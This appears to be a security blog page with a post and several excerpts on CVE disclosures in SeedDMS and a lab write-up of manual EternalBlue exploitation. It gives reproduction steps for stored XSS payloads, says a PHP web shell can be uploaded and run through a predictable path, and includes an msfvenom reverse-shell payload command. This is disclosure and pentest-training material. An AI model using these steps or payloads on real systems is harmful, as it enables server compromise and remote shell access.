### Exploit for CVE-2019-12745 - Stored XSS (Cross-Site Scripting)

[June 19, 2019](https://secfolks.blogspot.com/2019/06/exploit-for-cve-2019-12745-stored-xss.html "permanent link")

In a series of my findings in SeedDMS Software. A quick update, SeedDMS is a opensource software in which I have found Vulnerabilities like [RCE](https://secfolks.blogspot.com/2019/06/exploit-for-cve-2019-12744-remote.html) and [XSS](https://secfolks.blogspot.com/2019/06/exploit-for-cve-2019-12801-stored-xss.html). This article is focused on the XSS finding, I had found in the latest version of SeedDMS. Lets get into the Exploitation part to see how it can be reproduced.

1. Login to the application and go to My account and edit user details.
2. Change the name by adding <script>alert("name")</script> as shown in below image.

3. Now browse to user management option in Admin-tools and click on choose user to execute the previously inserted javascript code.

A key takeway from this finding is that while pentesting try injecting JS payloads very specific for example here I have used "name" rather than traditional "1" inside the alert box. Why? You might ask. Reason is simple you might not know when where sanitisation and validation is not in place, and your injected payload might get executed somewhere else.
P.S. I have already reported this to the vendor and they have patched it and issued an update for the same.

[June 19, 2019](https://secfolks.blogspot.com/2019/06/exploit-for-cve-2019-12744-remote.html "permanent link")

As of late, I have discovered a genuine vulnerability RCE (Remote Command Execution) in one of the open-source software to be specific “SeedDMS”. Through this vulnerability, an attacker can upload a backdoor/web shell and execute commands on the server.  Because of the security concerns and impediments, I wouldn't be uploading any snippets or screenshots here but would try to explain it as brief as could be expected under the circumstances.  How about we get into the Exploit part as follows: Sign in to the application and inside any folder upload a PHP web shell file (there is no restriction or validation on the uploaded file). Presently in URL, you can observe a document id corresponding to the file uploaded (This ID is actually the folder name, I will jump on to this towards the end of the blog as to how I learned about the same)  Now go to the following URL "example.com/data/1048576/DOCUMENT\_ID/1.php"   That is it!!!... Right it might sound very st...

### [Exploit for CVE-2019-12932 - Stored XSS (Cross-Site Scripting)](https://secfolks.blogspot.com/2019/07/exploit-for-cve-2019-12932-stored-xss.html)

[July 31, 2019](https://secfolks.blogspot.com/2019/07/exploit-for-cve-2019-12932-stored-xss.html "permanent link")

Summary:  Recently I got 4 CVEs for reporting security issues in an opensource software namely SeedDMS. This particular post talks about the Exploit for CVE-2019-12932 which was present in SeedDMS 5.1.11 and has been patched and 5.1.12 has been released to fix the same. Exploit: Login to the application as a user and make a new folder, with your payload in name parameter as shown. Now save it as shown. Now search for the folder name to execute the XSS. I try to keep my posts as precise and to the point so incase you face any issue replicating the same, feel free to comment.

### [Eternal Blue (MS17-010) - Manual Exploitation](https://secfolks.blogspot.com/2020/02/eternal-blue-ms17-010-manual.html)

[February 11, 2020](https://secfolks.blogspot.com/2020/02/eternal-blue-ms17-010-manual.html "permanent link")

Background: As a part of my preparation for OSCP, I came across a way to manually exploit eternal blue (without  metasploit). So compiling the same here so it could be useful to others too. For the purpose of demonstration I am using blue machine from Hack the Box (HTB). Exploit Use searchsploit to find the eternal blue exploit or you can even download it from exploitdb Now there are some modifications required and files required. We need to first make our backdoor exe to get a shell back. msfvenom -p windows/shell\_reverse\_tcp LHOST=IP LPORT=4444 -f exe > blue.exe Now we need to make few changes in the script from Exploitdb or searchsploit as follows: If we go through the script it will tell us we also need a smb file as a dependency for running this script. So you can download that file from here Now open a listener to get back a shell and run the script with the argument "netsvcs" Reference: https://github.com/worawit/MS17-010/blob/master/mysmb.py ht...
